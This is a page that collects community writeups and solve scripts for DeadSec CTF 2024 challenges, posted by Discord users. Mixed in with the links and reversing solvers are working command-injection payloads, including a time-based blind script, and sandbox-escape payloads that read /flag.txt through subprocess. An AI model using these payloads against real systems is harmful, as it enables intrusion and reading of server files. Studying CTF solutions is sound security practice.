---
layout: note
title: DeadSec CTF Writeups (By Others)
---

> All the usernames mentioned below are discord usernames
{: .prompt-info}

**By @dasrealbert**
- <https://bertsec.com/2024/07/27/deadsec-ctf-2024-mic-check/><br>
- <https://bertsec.com/2024/07/27/deadsec-ctf-2024-financial-supporter/><br>
- <https://bertsec.com/2024/07/26/deadsec-ctf-2024-windows-server/><br>
- <https://bertsec.com/2024/07/26/deadsec-ctf-2024-bing-2/><br>
- <https://bertsec.com/2024/07/26/deadsec-ctf-2024-welcome/><br>

**By @smiley7719**
- <https://github.com/rerrorctf/writeups/tree/main/2024_07_26_DeadSecCTF24>

**By @y.k.z**
- <https://yun.ng/c/ctf/2024-deadsec-ctf/crypto/not-an-active-field-for-a-reason><br>
- <https://yun.ng/c/ctf/2024-deadsec-ctf/misc/man-in-the-middle><br>
- <https://yun.ng/c/ctf/2024-deadsec-ctf/misc/golparty><br>
- <https://yun.ng/c/ctf/2024-deadsec-ctf/web/buntime><br>
- <https://yun.ng/c/ctf/2024-deadsec-ctf/web/colorful-board><br>
- <https://yun.ng/c/ctf/2024-deadsec-ctf/web/retrocalc> <br>

**By @babbadeckl**
- Solve script for `Bing Revenge`

```python
import requests
import string

base_time = ''
flag= ''
url = 'http://localhost:7000/flag'
url = 'https://TEAM_URL.deadsec.quest/flag'

session = requests.Session()
response_baseline= session.post(url, data={'host':'127.0.0.1'}, headers={'Content-Type':'application/x-www-form-urlencoded'})
time_baseline = response_baseline.elapsed.total_seconds()

#after a few char leaks it was pretty obvious that it was a uuid4, so i adjusted the alphabet accordingly 
alphabet = string.digits + string.ascii_lowercase + '-' + '}' + '{' 

print(f"Time Baseline: {time_baseline}")

for i in range(len(flag)+1,50):
    print(f"[Round {i}]")
    for char in alphabet:
        payload = {'host':f'127.0.0.1;if [ $(cat /flag.txt|cut -c {i}) = {char} ]; then sleep 5; fi'}
        print(f"Current payload: {payload}")
        response = session.post(url, data=payload, headers={'Content-Type':'application/x-www-form-urlencoded'})
        if response.elapsed.total_seconds() > time_baseline + 4:
            flag += char
            print(f"[*] Found new char '{char}'. Flag: '{flag}'")
            break
```

- Request payload for `Bing 2`
```plaintext
Submit=Submit&ip=;"c"at${IFS}/"f"lag.txt
```

**By @skusku**
- Solve script for `JavaCPScript`

```python
import string
import itertools


# List of lambda functions for the transformations
transformations = [
    {"name": 7, "fn": lambda data: data ^ ((data >> 7) | (data << 1))},
    {"name": 4, "fn": lambda data: data ^ ((data >> 4) | (data << 4))},
    {"name": 6, "fn": lambda data: data ^ ((data >> 6) | (data << 2))},
    {"name": 5, "fn": lambda data: data ^ ((data >> 5) | (data << 3))}
]

integer_values = [
    3895813, 3893664, 3895583, 3893639, 3919755, 3893694, 3871506, 3871544,
    3810527, 3921672, 3913158, 3813122, 3869603, 3813209, 3910936, 3911023,
    3896081, 3822626, 3913160, 3919793, 3822653, 3895614, 3820987, 3820987, # 3820987 is listed twice, included once if unique is needed
    3932159, 3911025, 3893657, 3921671, 3820578, 3921709, 3921698, 3910918
]

flag = []

for entry, idx in zip(integer_values[::-1], reversed(range(2304 - len(integer_values), 2304))):
    # print(idx, entry)
    found = False

    for permutation in itertools.permutations(transformations): # perm:
        if found:
            break

        for chr in string.printable:
            inputval = ord(chr)

            data = idx ^ inputval
            transformed_data = data

            for transform in permutation:
                transformed_data = transform["fn"](transformed_data)

            if transformed_data == entry:
                flag.append(chr)
                found = True
                print(f"Hooray, its {chr}, the permutations is {[transform['name'] for transform in permutation]}")
                break

print("".join(flag[::-1]))
```

**By @yuuna4173**
- Solve for `Retrocalculator`

```plaintext
{"inputs": "Object.getOwnPropertyNames({}).__getattribute__('__getattribute__')('__class__').__base__.__subclasses__()[99].get_data(0, '/flag.txt')"}
```

```bash
curl -H 'Content-Type:application/json' 'https://17364dd12d19fe7e6a7f321c.deadsec.quest/result' -d @payload
```

**By @mumuzi1**
- <https://mumuzi7179.github.io/docs/Blog/CTFWP/DeadSecCTF2024>


**By @rookiecookiefx**
- Solve script for `GOLParty`

```python
from pwn import *
import numpy as np

context.log_level = 'debug'

ON = 255
OFF = 0

def count_live_neighbors(grid, x, y, M, N):
    directions = [(-1, -1), (-1, 0), (-1, 1),
                  (0, -1),         (0, 1),
                  (1, -1), (1, 0), (1, 1)]
    count = 0
    for dx, dy in directions:
        nx, ny = x + dx, y + dy
        if 0 <= nx < M and 0 <= ny < N:
            count += grid[nx][ny] == ON
    return count

def nextGeneration(grid):
    M, N = grid.shape
    # Add padding of OFF cells to allow for potential expansion
    expanded_grid = np.pad(grid, pad_width=1, mode='constant', constant_values=OFF)
    future = np.zeros_like(expanded_grid)

    for l in range(expanded_grid.shape[0]):
        for m in range(expanded_grid.shape[1]):
            aliveNeighbours = count_live_neighbors(expanded_grid, l, m, expanded_grid.shape[0], expanded_grid.shape[1])

            if expanded_grid[l, m] == ON:
                if 2 <= aliveNeighbours <= 3:
                    future[l, m] = ON
            else:
                if aliveNeighbours == 3:
                    future[l, m] = ON

    # Remove any completely empty rows and columns around the future grid
    # future = trim_grid(future)
    return future

def trim_grid(grid):
    # Find non-zero rows and columns
    non_empty_rows = np.any(grid == ON, axis=1)
    non_empty_cols = np.any(grid == ON, axis=0)

    # Trim the grid to remove rows and columns that are completely OFF
    return grid[np.ix_(non_empty_rows, non_empty_cols)]

def parse_grid(grid_str):
    return np.array([[ON if cell == '■' else OFF for cell in row] for row in grid_str.strip().split('\n')], dtype=int)

def game_of_life(grid_str, generations):
    grid = parse_grid(grid_str)
    for gen in range(generations):
        # print(f"Generation: {gen}")
        grid = nextGeneration(grid)
        # for row in grid:
        #     print("".join('*' if cell == ON else '.' for cell in row))
        # print()
    return grid


conn = remote("34.132.190.59", 32535)
try:
    conn.recvuntil(b"\n\n")
    conn.recvuntil(b"\n\n")
    conn.recvuntil(b"\n\n")
    game = conn.recvuntil(b"\n\n").decode("utf-8")
    game_statement = conn.recv().decode("utf-8")
    gno = game_statement.split()[-2]

    # print("\n\n\n",game)
    # print(game_statement)

    final = game_of_life(game, int(gno))

    count = np.sum(final == ON)
    
    conn.sendline(f"{count}")
    
    while True:
        final_game = ""
        game_number = 0
        
        conn.recvuntil(b"[+] Correct!")
        game = conn.recvuntil(b"\n\n").decode("utf-8")
        if "flag" in game:
            break
        game_statement = conn.recv().decode("utf-8")
        gno = game_statement.split()[-2]

        print("\n\n\n",game)
        # print(game_statement)

        final = game_of_life(game, int(gno))

        count = np.sum(final == ON)
        
        conn.sendline(f"{count}")


    conn.interactive()
except Exception as e:
    log.error(f"An error occurred: {e}")
finally:
    conn.close()
```


**By @sihyeokpark**
- <https://blog.exon.kr/posts/ctf/2024/deadsec/>

**By @duty1g**
- Solve payload for `RetroCalculator`

```plaintext
Object.constructor.constructor('\\x70\\x79\\x69\\x6d\\x70\\x6f\\x72\\x74\\x20\\x73\\x75\\x62\\x70\\x72\\x6f\\x63\\x65\\x73\\x73\\x3b\\x20\\x72\\x65\\x74\\x75\\x72\\x6e\\x20\\x73\\x75\\x62\\x70\\x72\\x6f\\x63\\x65\\x73\\x73\\x3b')().check_output(['cat','/flag.txt'])
```
OR

```plaintext
let ppen = Object.getOwnPropertyNames({}).__getattribute__('__getattribute__')('__class__').__base__.__subclasses__()[351]\nppen('cat /flag.txt',-1, null, -1, -1, -1, null, null, true).communicate()[0]
```

**By @stelin41**
- Solve for `Flag Injection`

```bash
#dead_test_flag_which_is_exactly_this_long_
#XXXXXXXXXXXXXffffffffffffffffffff
echo "0\n13\nffffffffffffffffffff\ndaaaaaaaaaaaaffffffffffffffffffff" | nc 34.121.62.108 32564
# dead_ivswjlvaffffffffffffffffffff
echo "10\n23\nffffffffffffffffffff\nlva__________ffffffffffffffffffff" | nc 34.121.62.108 32564
# lvahxmifksxjgffffffffffffffffffff
echo "20\n33\nffffffffffffffffffff\nxjg__________ffffffffffffffffffff" | nc 34.121.62.108 32564
# xjgifrzfhljkdffffffffffffffffffff
echo "29\n42\nffffffffffffffffffff\nljkd__________ffffffffffffffffffff" | nc 34.121.62.108 32564
# ljkdprcaubac_ffffffffffffffffffff


# dead_ivswjlvahxmifksxjgifrzfhljkdprcaubac_
# DEAD{ivswjlvahxmifksxjgifrzfhljkdprcaubac}
```

**By @hex01e**
- Solve for `Bing2`

```bash
curl https://f0e12882e297eee28e7649e4.deadsec.quest//bing.php -X POST -d 'Submit&ip=;head    /f?ag.txt'
```


**By @kumail_93722_98341**
- [Solve for `Financial Supporter 2`](https://strangek.vercel.app/blog/writeups/deadsec/osint/finance)


**By @_onsra_**
- <https://docs.google.com/document/d/1eFzXamzW74YQ4N4Qo2poNSGhXeDzacvtTaG1LpJdtcs/edit?usp=sharing>


**By @0x0oz**
- <https://0x0oz.github.io/writeups/deadsec-ctf-2024#web>


**By @kinasant**
- <https://thr34dr1pp3r.gitbook.io/ctf/deadsec-ctf-2024>


**By @theflash2k**
- <https://www.theflash2k.me/blog/writeups/deadsec23/pwn/user-management>


**By @jonason010592**
- <https://jonason0592.substack.com/p/deadsec-ctf-2024-web-writeup>


**By @elliptic_curve**
- <https://c0degolf.github.io/posts/writeup/deadsec-ctf/deadsec2024/>


**By @zzre**
- <https://github.com/zzre/DeadSecCTF-2024-FlagChecker/blob/main/README.md>


**By @clonecomposite**
- <https://shellunease.github.io/posts/deadsecctf-2024-buntime/>


**By @roquero**
-  https://github.com/TommyNi/writeups/blob/main/ctf/2024/DeadSecCTF/Bing2/writeup.md


**By @whitedragon_369**
- <https://dr4g0n369.github.io/CTF_Writeups/>

**By @tsumi1307**
- <https://tsumiiiiiiii.github.io/deadsec24/>


**By @t13ee**
- Solve for `JavaCPScript`

```python
from z3 import *


def cal_1(char, count):
    char ^= count
    char ^= ((char >> 7) | (char << 1))
    char ^= ((char >> 6) | (char << 2))
    char ^= ((char >> 5) | (char << 3))
    char ^= ((char >> 4) | (char << 4))
    return char

def cal_2(char, count):
    char ^= count
    char ^= ((char >> 6) | (char << 2))
    char ^= ((char >> 5) | (char << 3))
    char ^= ((char >> 4) | (char << 4))
    char ^= ((char >> 7) | (char << 1))
    return char


solver = Solver()

length = 32
data = [BitVec("data_%d" % i, 32) for i in range(length)]

for char in data:
    solver.add(char >= 0x20, char <= 0x7e)

solver.add(cal_1(data[0], 2272) == 3895813)
solver.add(cal_2(data[1], 2273) == 3893664)
solver.add(cal_2(data[2], 2274) == 3895583)
solver.add(cal_2(data[3], 2275) == 3893639)
solver.add(cal_2(data[4], 2276) == 3919755)
solver.add(cal_2(data[5], 2277) == 3893694)
solver.add(cal_2(data[6], 2278) == 3871506)
solver.add(cal_2(data[7], 2279) == 3871544)
solver.add(cal_1(data[8], 2280) == 3810527)
solver.add(cal_2(data[9], 2281) == 3921672)
solver.add(cal_2(data[10], 2282) == 3913158)
solver.add(cal_2(data[11], 2283) == 3813122)
solver.add(cal_2(data[12], 2284) == 3869603)
solver.add(cal_2(data[13], 2285) == 3813209)
solver.add(cal_2(data[14], 2286) == 3910936)
solver.add(cal_2(data[15], 2287) == 3911023)
solver.add(cal_1(data[16], 2288) == 3896081)
solver.add(cal_2(data[17], 2289) == 3822626)
solver.add(cal_2(data[18], 2290) == 3913160)
solver.add(cal_2(data[19], 2291) == 3919793)
solver.add(cal_2(data[20], 2292) == 3822653)
solver.add(cal_2(data[21], 2293) == 3895614)
solver.add(cal_2(data[22], 2294) == 3820987)
solver.add(cal_2(data[23], 2295) == 3820987)
solver.add(cal_1(data[24], 2296) == 3932159)
solver.add(cal_2(data[25], 2297) == 3911025)
solver.add(cal_2(data[26], 2298) == 3893657)
solver.add(cal_2(data[27], 2299) == 3921671)
solver.add(cal_2(data[28], 2300) == 3820578)
solver.add(cal_2(data[29], 2301) == 3921709)
solver.add(cal_2(data[30], 2302) == 3921698)
solver.add(cal_2(data[31], 2303) == 3910918)


if solver.check() == sat:
    model = solver.model()
    print("".join([chr(model[data[i]].as_long()) for i in range(length)]))
else:
    print("Not Found")
```

**By @acters.**
- Solve for `JavaCPScript`

```python
import string

def bitwise_operations(steps_variant, final_value, initial_value, charater_value):
    steps = [[0,1,2,3,4],[0,4,1,2,3]]
    intermediary_value = initial_value
    for step in steps[steps_variant]:
        match step:
            case 0:
                intermediary_value ^= charater_value
            case 1:
                intermediary_value ^= ((intermediary_value >> 6) | (intermediary_value << 2))
            case 2:
                intermediary_value ^= ((intermediary_value >> 5) | (intermediary_value << 3))
            case 3:
                intermediary_value ^= ((intermediary_value >> 4) | (intermediary_value << 4))
            case 4:
                intermediary_value ^= ((intermediary_value >> 7) | (intermediary_value << 1))
    return intermediary_value == final_value
    



initial_values = range(2272,2304)
array_of_initial_values_and_steps_variant = [{"steps_variant":0,"initial_value":2303,"final_value":3910918},{"steps_variant":0,"initial_value":2302,"final_value":3921698},{"steps_variant":0,"initial_value":2301,"final_value":3921709},{"steps_variant":0,"initial_value":2300,"final_value":3820578},{"steps_variant":0,"initial_value":2299,"final_value":3921671},{"steps_variant":0,"initial_value":2298,"final_value":3893657},{"steps_variant":0,"initial_value":2297,"final_value":3911025},{"steps_variant":1,"initial_value":2296,"final_value":3932159},{"steps_variant":0,"initial_value":2295,"final_value":3820987},{"steps_variant":0,"initial_value":2294,"final_value":3820987},{"steps_variant":0,"initial_value":2293,"final_value":3895614},{"steps_variant":0,"initial_value":2292,"final_value":3822653},{"steps_variant":0,"initial_value":2291,"final_value":3919793},{"steps_variant":0,"initial_value":2290,"final_value":3913160},{"steps_variant":0,"initial_value":2289,"final_value":3822626},{"steps_variant":1,"initial_value":2288,"final_value":3896081},{"steps_variant":0,"initial_value":2287,"final_value":3911023},{"steps_variant":0,"initial_value":2286,"final_value":3910936},{"steps_variant":0,"initial_value":2285,"final_value":3813209},{"steps_variant":0,"initial_value":2284,"final_value":3869603},{"steps_variant":0,"initial_value":2283,"final_value":3813122},{"steps_variant":0,"initial_value":2282,"final_value":3913158},{"steps_variant":0,"initial_value":2281,"final_value":3921672},{"steps_variant":1,"initial_value":2280,"final_value":3810527},{"steps_variant":0,"initial_value":2279,"final_value":3871544},{"steps_variant":0,"initial_value":2278,"final_value":3871506},{"steps_variant":0,"initial_value":2277,"final_value":3893694},{"steps_variant":0,"initial_value":2276,"final_value":3919755},{"steps_variant":0,"initial_value":2275,"final_value":3893639},{"steps_variant":0,"initial_value":2274,"final_value":3895583},{"steps_variant":0,"initial_value":2273,"final_value":3893664},{"steps_variant":1,"initial_value":2272,"final_value":3895813}]
all_characters = string.ascii_letters+string.digits+"{}_"



for initial_values_and_steps_variant_object in reversed(array_of_initial_values_and_steps_variant):
    for test_charater in all_characters:
        if bitwise_operations(initial_values_and_steps_variant_object["steps_variant"], initial_values_and_steps_variant_object["final_value"], initial_values_and_steps_variant_object["initial_value"], ord(test_charater)):
            print(test_charater,end="")
```